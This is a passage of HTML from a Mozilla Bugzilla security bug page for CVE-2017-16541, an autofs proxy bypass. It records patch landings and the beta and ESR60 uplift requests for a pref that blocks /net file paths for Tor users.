          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081">Bug 1412081</a> - Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms r=jimm</pre></div><div class="change-set" id="c97"><div class="comment" data-id="13475461" data-no="97"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-97" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a22377217_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a22377217_279663"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-97"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-97" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c97">Comment 97</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-16 15:23 PDT" data-time="1531779792">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-97">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-97" data-comment-id="13475461"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/9ec0f327c5ef">https://hg.mozilla.org/mozilla-central/rev/9ec0f327c5ef</a>
<a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/26163df1083e">https://hg.mozilla.org/mozilla-central/rev/26163df1083e</a></pre><div class="activity"><div class="change">Group: network-core-security &rarr; core-security-release</div><div class="change">Status: NEW &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2018-07-16 15:23 PDT" data-time="1531779792">3 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox63&amp;o1=isnotempty">status-firefox63</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox63&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla63</div></div></div><div class="change-set" id="c98"><div class="comment" data-id="13476914" data-no="98"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-98" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a22377217_279663"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a22377217_279663"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-98"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-98" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c98">Comment 98</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-17 07:24 PDT" data-time="1531837481">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-98">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-98" data-comment-id="13476914">(In reply to Christoph Kerschbaumer [:ckerschb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c46">comment #46</a>)
<span class="quote">&gt; I think Boris added a bunch of very valuable information within <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c44">comment 44</a>.
&gt; Probably it's best we don't do stat() within ::init() but instead rather
&gt; move it to asyncOpen2. Or more precisely to the contentSecurityManager right
&gt; after we preform the CheckLoadURI check.</span >

I'm late to this particular party, but should we perhaps still pursue this in a follow-up bug as a belt-and-suspenders type mitigation in case attackers find another type of path that somehow leaks information in this way? Christoph?</pre><div class="activity"><div class="change">Flags: needinfo?(ckerschb)</div></div></div><div class="change-set" id="c99"><div class="comment" data-id="13479122" data-no="99"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-99" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a22377217_279663"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a22377217_279663"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-99"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-99" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c99">Comment 99</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-18 03:01 PDT" data-time="1531908114">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-99">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-99" data-comment-id="13479122">Mind requesting uplift to beta/esr60?</pre><div class="activity"><div class="change">Flags: needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c100"><div class="comment" data-id="13481159" data-no="100"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-100" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22377217_279663"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22377217_279663"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-100"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-100" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c100">Comment 100</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-18 16:33 PDT" data-time="1531956787">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-100">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8993177"
         class="attachment patch"
         data-id="8993177" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="base-fccf4d48dfca">
      <meta itemprop="contentSize" content="28225">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8993177">
          <a class="link" href="attachment.cgi?id=8993177&amp;action=diff">
        <span id="att-8993177-description" itemprop="description">Add ability to blacklist file paths on Unix platforms</span></a>
        — <a href="attachment.cgi?id=8993177&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8993177">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="a22910887_415378"><div class="change" id="aa22910887_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22910887_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a22910887_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a22910887_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a22910887_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a22910887_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-18 16:33 PDT" data-time="1531956821">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990058&amp;action=edit"
           title="Add ability to blacklist file paths on Unix platforms"
           class=""
        >Attachment #8990058</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c101"><div class="comment" data-id="13481169" data-no="101"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-101" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22910887_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22910887_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-101"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-101" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c101">Comment 101</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-18 16:41 PDT" data-time="1531957262">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-101">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-101" data-comment-id="13481169"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=f0e7099c44c4dff51e98f623f2eb696bfd914797">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=f0e7099c44c4dff51e98f623f2eb696bfd914797</a></pre></div><div class="change-set" id="c102"><div class="comment" data-id="13481170" data-no="102"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-102" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22910887_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22910887_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-102"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-102" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c102">Comment 102</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-18 16:41 PDT" data-time="1531957276">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-102">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8993178"
         class="attachment patch"
         data-id="8993178" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="base-ebb70b9ccc0b">
      <meta itemprop="contentSize" content="30441">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8993178">
          <a class="link" href="attachment.cgi?id=8993178&amp;action=diff">
        <span id="att-8993178-description" itemprop="description">[ESR60]  patch</span></a>
        — <a href="attachment.cgi?id=8993178&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8993178">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="c103"><div class="comment" data-id="13483592" data-no="103"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-103" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22910887_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22910887_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-103"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-103" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c103">Comment 103</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-19 13:29 PDT" data-time="1532032149">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-103">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-103" data-comment-id="13483592">Comment on <span class=""><a href="/attachment.cgi?id=8993177" name="attach_8993177" title="Add ability to blacklist file paths on Unix platforms">attachment 8993177</a> <a href="/attachment.cgi?id=8993177&amp;action=edit" title="Add ability to blacklist file paths on Unix platforms">[details]</a> <a href="/attachment.cgi?id=8993177&amp;action=diff" title="Add ability to blacklist file paths on Unix platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8993177'>[review]</a>
Add ability to blacklist file paths on Unix platforms

Approval Request Comment
[Feature/Bug causing the regression]:
TOR requirement to block access to certain paths on the filesystem

[User impact if declined]:
A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.

[Is this code covered by automated tests?]:
The patch includes a gtest

[Has the fix been verified in Nightly?]:
Yes

[Needs manual test from QE? If yes, steps to reproduce]: 
Reproduce <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c0">comment 0</a>. Set network.file.path_blacklist to /net. Restart the browser. Check that the bug is fixed.

[List of other uplifts needed for the feature/fix]:
<span class=""><a href="/attachment.cgi?id=8990057" name="attach_8990057" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">attachment 8990057</a> <a href="/attachment.cgi?id=8990057&amp;action=edit" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">[details]</a> <a href="/attachment.cgi?id=8990057&amp;action=diff" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8990057'>[review]</a> to avoid leaks in the plugin process.

[Is the change risky?]:
Low risk

[Why is the change risky/not risky?]:
The patch only produces effects when the pref is set, which will probably only affect TOR.

[String changes made/needed]:
None.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div><div class="change">
        <a href="/attachment.cgi?id=8993177&amp;action=edit"
           title="Add ability to blacklist file paths on Unix platforms"
           class=""
        >Attachment #8993177</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="a22986236_415378"><div class="change" id="aa22986236_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22986236_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a22986236_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a22986236_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a22986236_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a22986236_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-19 13:29 PDT" data-time="1532032170">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8986596&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8986596</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c104"><div class="comment" data-id="13483606" data-no="104"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-104" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22986236_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22986236_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-104"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-104" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c104">Comment 104</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-19 13:34 PDT" data-time="1532032448">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-104">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-104" data-comment-id="13483606">Comment on <span class=""><a href="/attachment.cgi?id=8993178" name="attach_8993178" title="[ESR60]  patch">attachment 8993178</a> <a href="/attachment.cgi?id=8993178&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8993178&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8993178'>[review]</a>
[ESR60]  patch

[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Required in TOR.

User impact if declined:
[TOR] A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.

Fix Landed on Version:
Firefox 63 with an uplift requested for beta 62.

Risk to taking this patch (and alternatives if risky):
Low risk. Functionality is only enabled with the hidden pref set, which would be only in TOR.

String or UUID changes made by this patch:
None.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8993178&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8993178</a> -
        Flags: approval-mozilla-esr60?</div></div></div><div class="change-set" id="c105"><div class="comment" data-id="13485545" data-no="105"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-105" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a22986236_415378"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a22986236_415378"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-105"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-105" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c105">Comment 105</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-20 09:12 PDT" data-time="1532103123">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-105">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-105" data-comment-id="13485545">Hi Valentin, just a note, generally by &quot;verified&quot; we mean that the issue was reproducible and the fix was checked by someone who isn't the assignee or reviewer.</pre></div><div class="change-set" id="a23057213_451704"><div class="change" id="aa23057213_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a23057213_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a23057213_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a23057213_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a23057213_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a23057213_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-20 09:12 PDT" data-time="1532103147">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: qe-verify+</div></div></div><div class="change-set" id="c106"><div class="comment" data-id="13485551" data-no="106"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-106" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a23057213_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a23057213_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-106"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-106" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c106">Comment 106</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-20 09:13 PDT" data-time="1532103206">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-106">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-106" data-comment-id="13485551">Comment on <span class=""><a href="/attachment.cgi?id=8993177" name="attach_8993177" title="Add ability to blacklist file paths on Unix platforms">attachment 8993177</a> <a href="/attachment.cgi?id=8993177&amp;action=edit" title="Add ability to blacklist file paths on Unix platforms">[details]</a> <a href="/attachment.cgi?id=8993177&amp;action=diff" title="Add ability to blacklist file paths on Unix platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8993177'>[review]</a>
Add ability to blacklist file paths on Unix platforms

Fix for potential de-anonymization, let's uplift for beta 11.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8993177&amp;action=edit"
           title="Add ability to blacklist file paths on Unix platforms"
           class=""
        >Attachment #8993177</a> -
        Flags: approval-mozilla-beta? &rarr; approval-mozilla-beta+</div></div></div><div class="change-set" id="a23057290_451704"><div class="change" id="aa23057290_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a23057290_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a23057290_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a23057290_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a23057290_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-20 09:13 PDT" data-time="1532103224">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990057&amp;action=edit"
           title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms"
           class=""
        >Attachment #8990057</a> -
        Flags: approval-mozilla-beta+</div></div></div><div class="change-set" id="c107"><div class="comment" data-id="13489478" data-no="107"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-107" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a23057290_451704"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a23057290_451704"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-107"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-107" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c107">Comment 107</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 00:53 PDT" data-time="1532332433">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-107">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-107" data-comment-id="13489478"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-beta/rev/5b05309eb9be">https://hg.mozilla.org/releases/mozilla-beta/rev/5b05309eb9be</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-beta/rev/dd493fc5f6a7">https://hg.mozilla.org/releases/mozilla-beta/rev/dd493fc5f6a7</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=isnotempty">status-firefox62</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c108"><div class="comment" data-id="13490203" data-no="108"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-108" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_599255" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/889014bb763c199a5d7570eeee34f328?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_599255" id="a23057290_451704"><a class="email " href="/user_profile?user_id=599255" > <span class="fna">Oana Botisan, Desktop Release QA</span></a>
</div>
          </td>

